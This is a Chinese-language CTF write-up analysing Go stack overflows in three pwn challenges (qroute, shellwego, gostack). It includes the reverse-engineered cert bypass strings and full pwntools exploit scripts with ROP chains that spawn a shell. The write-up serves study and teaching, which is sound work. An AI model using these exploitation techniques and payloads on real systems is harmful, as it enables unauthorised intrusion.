自从CISCN过后，又好久没有遇到什么go中的栈溢出了。这次打了强网有个qroute也是go中的栈溢出，借此机会复现这道题同时再做一下之前做过的go的栈溢出，总结一下go中栈溢出应该怎么发现利用

强网杯S8-qroute
============

此题是参考[ACT的WP复现的](https://mp.weixin.qq.com/s?__biz=Mzg2OTcyODc1OA==&mid=2247488557&idx=1&sn=8653a99a5f38d001314aaecea2372c36&chksm=cf29e120dff605fb9609de0ea5a958bc5a23876a3a549aeeb8c419360a0caebed6f8335bd372&mpshare=1&scene=23&srcid=1105BcA7zCWxRx1qSMOFMEMG&sharer_shareinfo=5cd711fae5bd0dbe20177b28aa4db5df&sharer_shareinfo_first=5cd711fae5bd0dbe20177b28aa4db5df#rd),在复现的基础上记录一下自己遇到的困难以及如何解决

第一阶段
----

- 正常逆向后发现程序有如下功能

```text
cert 4ceb539da109caf8eea7

set  dns/set route/set interface
set dns primary 8.8.8.8
set route 192.168.1.0/24 gateway 192.168.0.1
set interface eth0 ip 192.168.0.10 netmask 255.255.255.0

show routes/show interfaces/show dns/show logs
delete route/delete interface/delete dns $var

exec ping host $var
exec traceroute $var

exit
logout
```

**这个cert很好过（和CISCN的shellwego有点像，都是要先cert），直接就看到是个RC4**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1890ed947fcb1f455a823126f9ee5f1be0751fcf.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-08c3d50981a5f8c8ff97967d411615ab43778cd8.png)

接下来要做的就是逆向各个功能，但是发现大部分函数都比较正常，在**exec ping**中发现有个很可疑的地方

![84.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2864ba6833b508882f9387469625b136ce2d83a8.png)

**go中的string一般会先存在一个比栈还高的地址，可以看到v29是可以根据v71=len不断累加的，然而赋值是个for循环， &amp;v79\[v29 + 1 + j\]是个栈上的地址，如果长度不合理，那么将覆盖返回地址**

**在go中，经常会看到这样的结构，buf\[i\]存的是一个指针，这个指针指向一个字符串，buf\[i+1\]存的是这个字符串的长度，可以看到v71 = \*(\_QWORD \*)(v28 + 8);也是这种结构**

所以我们可以大胆猜测，这个strings\_genSplit过后，**返回的是一个结构体数组，每个结构体元素是有(void \*)ptr,int64 len这种结构**，这里就是通过'.'这个字符进行分割，我进行了验证发现确实如此

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0e22ce8c3281988e440551d1c9a84a9ef42f1a83.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-04109785d70d5cfa1ecd3d02bbdb9b9a8c78a23f.png)

```c
//看到split就可以想到是通过某个字符来对整个字符串进行分割，这里是'.'
  v26 = strings_genSplit(a2,v102,(unsigned int)&unk_53BC00,1,0,-1,v13,v14,v15,(__int64)v75.ptr,v75.len,v76,v77);
  j = (__int64)v79;
  v28 = ((__int64 (__golang *)(__int64, __int64, __int64, char *))loc_4704F4)(v26, v102, v27, v79);
  v29 = 0LL;
  while ( v24 > 0 )
  {
    //看到这里可以想到v28像是一个数组，v28[i]存着指针，v28[i+1]存着len，所以会有v71 = *(_QWORD *)(v28 + 8);这种赋值
    v71 = *(_QWORD *)(v28 + 8);
    if ( v71 > 0x3F )
    {
      v96 = v10;
      v72 = runtime_convT64(v71, v24, v29, j, (int)v25, (int)v12, v13, v14, v15, (__int64)v75.ptr);
      *(_QWORD *)&v96 = &RTYPE_int;
      *((_QWORD *)&v96 + 1) = v72;
      return fmt_Fprintf((unsigned int)off_53D3C8,qword_5EC508,(unsigned int)"Label length exceeds 0x3F: %d\n",30,(unsigned int)&v96,1,1,v73,
               v74,(__int64)v75.ptr,v75.len,v76,v77,v78);
    }
    v25 = *(unsigned __int8 **)v28;
    v79[v29] = v71;
    //所以v29是可以根据v71=len不断累加的，这种漏洞非常常见
    if ( !v25 )
      v25 = (unsigned __int8 *)&unk_60C780;
    for ( j = 0LL; j < v71; ++j )
    {
      v12 = &v79[v29 + 1 + j];
      LODWORD(v13) = v25[j];
      *v12 = v13;
    }
    v28 += 16LL;
    --v24;
    v29 += v71 + 1;
  }
```

第二阶段
----

根据上面的分析，可以确定就是用很多'.'字符来让len增加，**一个'.'的len是0，所以这个for循环会立刻退出，但是v29 += v71 + 1;又让v29加1**，所以可以实现让len增加，所以正常的也会想出如下的exp来覆盖返回地址

但是实际跑的时候会不对，所以我又进行了很长的逆向分析过程分析为什么直接这样不行

```python
payload = b"."*0x207+p64(pop_rbp) + p64(bss)+ p64(pop_rcx) + p64(0x200) + p64(pop_rbx) + p64(0x006102B0) + p64(sys_read) + p64(leave_ret)[:5]
p.sendlineafter("Router",b"exec ping host " +payload)
```

主要原因在这里,如果j&lt;=0，那么会**有如下调用链LABEL\_15-&gt;net\_LookupIP-&gt;return ，这就直接返回了，根本走不到strings\_genSplit以及那个for循环**

```c
 v18 = v99;
  v21 = *(__int128 **)(v99 + 0x40);
  j = *(_QWORD *)(v99 + 0x48);
  len = v102;
  while ( 1 )
  {
    v22 = j <= 0;
    if ( j <= 0 )
    {
      v17 = len;
      ptr = (char *)a2;
      goto LABEL_15;
    }
    v23 = *((_QWORD *)v21 + 1);
    v12 = (char *)*((_QWORD *)v21 + 2);
    v13 = *((_QWORD *)v21 + 3);
    if ( len == v23 )
      break;
LABEL_8:
    v21 += 2;
    --j;
  }
```

这里我就很不明白，**可以看到ACT战队师傅的WP里面是有set\_dns(payload,b'1.1.1.1')这一步的**，于是我ida动调跟进看了看

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-01973f6ec686820548fc8e4c8c23bf6f88e13219.png)

可以看到set dns后这里的j变成了1

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1a4a6be39c9576691b76b23efa42ab3fcc2f09c4.png)

如果不做set dns对应的地方的值是这样的  
![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fbf9d2ed07088133e75882c742b8de0fb544a032.png)

我又做了如下尝试

```text
set dns aaaa 1.1.1.1
set dns bbbb 2.2.2.2
exec ping host aaaa
```

跟进看到如下结果，这里的j对应的值又变成了2

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d05883057b6433fd6946f56be4d138e03d5f7950.png)

所以可以得出结论，这里的set dns之后会在栈上有相应的记录，这个j = \*(\_QWORD \*)(v99 + 0x48);的赋值应该就是设置的dns的数目

**确实是搞清楚了这一步的原因，但是对于我来说，如果我在比赛中做这个题，我该如何想到是这一步的影响呢，这里我还没有想通，即使我再怎么动调，可能还是难以想到这里是set dns导致了程序流程这样的走向，可能这还需要一点猜测和悟性**

第三阶段
----

解决了上述问题后，能够覆盖到返回地址，基本上就是个布置ROP了，没有太多难度，需要注意golang函数调用方式，可以参考[这篇文章](https://www.jianshu.com/p/33c07f807ba9)

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
from Crypto.Cipher import ARC4

context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/route")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x8049324')
# p=remote('0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn',46453)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
# libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *0x4D858C')
    pause()

def set_dns(dns,ip):
    p.sendlineafter(b"Router",b"set dns " + dns + b" " + ip)

def set_route(route):
    p.sendlineafter("Router",b"set route " + route)

def exec(cmd):
    p.sendlineafter("Router",b"exec " + cmd)

p.sendline(b'cert 4ceb539da109caf8eea7')
p.sendline(b'configure')

pop_rax_rbp = 0x0000000000405368
pop_rbx = 0x0000000000461dc1
pop_rcx = 0x0000000000433347
bss = 0x006102B0
pop_rbp = 0x0000000000401030#: pop rbp ; ret
sys_read = 0x0048DB60 
leave_ret = 0x00000000004a721a
payload = b"."*0x207+p64(pop_rbp) + p64(bss)+ p64(pop_rcx) + p64(0x200) + p64(pop_rbx) + p64(0x006102B0) + p64(sys_read) + p64(leave_ret)[:5]
set_dns(payload,b'1.1.1.1')

# dbg()
p.sendlineafter("Router",b"exec ping host " +payload)

syscall = 0x004735A9 #mov  rdi, rbx;syscall
payload = p64(0) + p64(pop_rax_rbp) + p64(0x3b) + p64(0) + p64(pop_rbx) + p64(bss+0x100) + p64(syscall)
p.sendline(payload.ljust(0x100,b"\x00")+b"/bin/sh\x00")

p.interactive()

```

CISCN2023 shellwego
===================

第一阶段
----

这里先捋一下各个函数之间的调用关系

main\_main打印ciscnshell$或者nightingale#，然后调用main\_unk\_func0b05，**main\_unk\_func0b05是主要的函数，cert过后可以执行一些限制的命令。**

**如果输入cert会进入main\_unk\_func0b01函数，输入echo就会进入main\_unk\_func0b04，在main\_unk\_func0b04再调用main\_unk\_func0b03**

所以第一步我们要先过了cert，可以看func1中看到就是一个RC4加密然后进行base64，与JLIX8pbSvYZu/WaG字符串进行比较看看是否相同，RC4密钥也给了，所以可以想到就是直接cert S33UAga1n@#! 但是会报错Missing parameter

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3d6fd0d075af5062d67777332f1b4ab7fb445320.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a45cb9a8137d8b73a532c6725fe309c8c7456b28.png)

继续看func5中的cert流程，很明显地可以看到有个mov rdx, ...;cmp \[rcx\], rdx这种指令，**自然可以想到这就是字符串比较，而在逆向中这些字符串可以说是关键节点，一定要留意**。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1b2fb28802b3a4ed6c913cd8276ef7974ab1099c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-51b8ed1e3e9182363743be692fabcfd6c8f168d5.png)

所以变成cert nAcDsMicN S33UAga1n@#!就过了cert

第二阶段
----

过了cert我们就继续看有哪些指令可以用，进而发现漏洞。**这里建议直接看汇编流程图，这个题反汇编会把很多信息抹掉，具体为什么我也不清楚**

```text
发现ls后就会执行os_exec_Command os_exec__ptr_Cmd_Run，而且没有命令绕过比如用&,|这些。
cat只让cat flag得到假的flag，想要cat其他文件都会Permission denial
whoami,exit也没漏洞
cert函数对应的func1肯定要不用看了
```

这里记录一下我的一些思考，就是**这种题目的漏洞，想要直接命令绕过一般都不太可能，因为这些指令都是通过字符串比较，而且题目不会简单到直接给一个命令执行的漏洞**

**其次，想要通过输入直接溢出也不可能，你在go中的外界输入，比如cat b'a'\*0x200，这个0x200个a是不会直接存在函数调用的栈上的，而是存在类似mmap出来的很大的一块区域上的。所以如果想溢出，一定是在这把这个mmap区域的字符串复制到栈上的过程中，因为对len检查的不严格，所以导致栈溢出，进而getshell**

最后我们把目光锁定在echo这个命令上，它对应的函数也很多，对应func4,func3

**在func4函数中看到这样一个复制，v41变量在栈上，距离rbp为228h，而i的限制是0x400，所以很明显可以栈溢出，同时这里如果遇到的是'+'，只会直接跳过赋值，但是i仍然会增加**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-cc6fee32ad0d8ce41b0f8e7d9c39eb49c7384732.png)

所以我做了以下尝试pay=b'echo '+b'a'\*0x300，但是**发现甚至没有打印unk\_func0b04:这个字符串**，也就说明没有进入func3

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c9db2d91b13ca0deabeb451308be7c62be15f5ae.png)

翻到func4上面有如上内容，**看到了一个0x200的限制，所以可以先猜测这个地方是对输入的字符有0x200的长度限制，同时注意到func5中会调用strings\_genSplit，根据' '对字符串进行分析，其返回值我上面已经提到了。**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fec1af3d6463502bea9aeda6b4014c70d911daf7.png)

**所以可以很顺利的推测，这个0x200的限制应该是对分割后的每一个字符串进行限制，所以我想到了如下payload，pay=b'echo '+b'a'\*0x150+b' '+b'a'\*0x150，发现确实打崩了程序!!!**

第三阶段
----

第二阶段我们已经找到了利用点并且让程序dump，这种栈溢出的难点就在于找到溢出点，找到了后对于一个Pwn手来说打这个都不是什么大问题

实际操作的时候发现'unk\_func0b04'字符出竟然也在栈上，那么调整一下padding就好了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b71db3629dc26dfe30d72322964c8baaf7dc74d1.png)

- exp

```python
from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import p64
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/shellwego")
# p=gdb.debug("/home/zp9080/PWN/shellwego",'b *0x401265')
elf = ELF("/home/zp9080/PWN/shellwego")
def dbg():
    gdb.attach(p,'b *0x4C184F')
    pause()

dbg()
payload=b'cert nAcDsMicN S33UAga1n@#!'
p.sendline(payload)

poprdi_ret = 0x444fec
poprsi_ret = 0x41e818
poprdx_ret = 0x49e11d
poprax_ret = 0x40d9e6
syscall = 0x40328c

#unk_func0b04: 13  0xd
#用' '绕过cmp rdx,0x200
payload =b'echo '+b'a'*0x1f0 + b' ' + b'+'*0x33
payload += p64(poprdi_ret)
payload += p64(0)
payload += p64(poprax_ret)
payload += p64(0)
payload += p64(poprsi_ret)
payload += p64(0x59FE70)
payload += p64(poprdx_ret)
payload += p64(20)
payload += p64(syscall)

payload += p64(poprdi_ret)
payload += p64(0x59FE70)
payload += p64(poprax_ret)
payload += p64(59)
payload += p64(poprsi_ret)
payload += p64(0)
payload += p64(poprdx_ret)
payload += p64(0)
payload += p64(syscall)

p.sendlineafter("nightingale#",payload)
p.sendline("/bin/sh\x00")

p.interactive()
```

CISCN2024 gostack
=================

题目流程很简单，这个main\_main\_func2是个后门，但是main\_main\_func3永远返回0，所以正常情况下永远不会执行到后门。**所以如果能栈溢出，我们肯定是希望能够直接覆盖返回地址为后门就可以了**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-80f306d63646b6835d3764e7a52f313de36a7e4b.png)

可以看到main\_main\_func3中又有个for循环赋值，同时追溯v24的来源,如下，可以看到非常明显的栈溢出

```c
char *v24; // rdx
char v33[72]; // [rsp+48h] [rbp-1D0h] BYREF
char *v39; // [rsp+178h] [rbp-A0h]

v24 = v39;
v39 = v33;
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-102a17e6beca9863520bd09af7f03836cb7a3354.png)

bufio\_\_ptr\_Scanner\_Scan函数读取的字符串还是跟我上面说的一样，存到一个类似mmap出来的区域

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9b7b32a5533e2e28c6582d51997a431988c915f7.png)

所以正常思路的payload应该是这样payload = b'a'\*0x1d0+p64(backdoor),但是会发现程序奇怪的崩掉了

追溯一下原因，**发现for循环赋值后还有别的函数要执行，那么把原本栈上的数据覆盖为a肯定会影响其他函数执行，在其他函数执行的时候程序就崩掉了，执行不到后门**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8d8d5ae7fc16df749cdd8103a9b6dfab60d10ac0.png)

所以我采用了如下payload，payload = b'\\x00'\*0x1d0+p64(backdoor)，这就打通了。

**这样做的原因主要是根据经验，一般函数传参传入个null一般都没什么事，或者用一个可写地址覆盖也行，但这里我试了可写地址不行。所以用了这个方法。还有种更暴力的方法，直接看栈上每个地方存的数据，然后一个个换源，如果是个可写地址那就覆盖为bss就行**

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
from Crypto.Cipher import ARC4

context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/gostack")
# p=gdb.debug("/home/zp9080/PWN/gostack",'b *0x4A0A97')
# p=remote('0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn',46453)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/gostack")
# libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *0x4A0A41')
    pause()

# dbg()
backdoor=0x4A0AF6
payload = b'\x00'*0x1d0+p64(backdoor)

p.sendlineafter("Input your magic message :",payload)
p.sendline('sh')

p.interactive()

```

一些总结
====

通过上面三个例题，对go的栈溢出肯定有一些感受。**我个人认为的难点还是找到溢出点，能够覆盖到返回地址让程序崩溃基本已经成功了，大部分时间还是在寻找漏洞点,go的反汇编一般都不是很好看，所以要有一定的猜测和经验，然后通过静态分析和动态分析相结合的方式，才能更好地找到漏洞点并进行利用**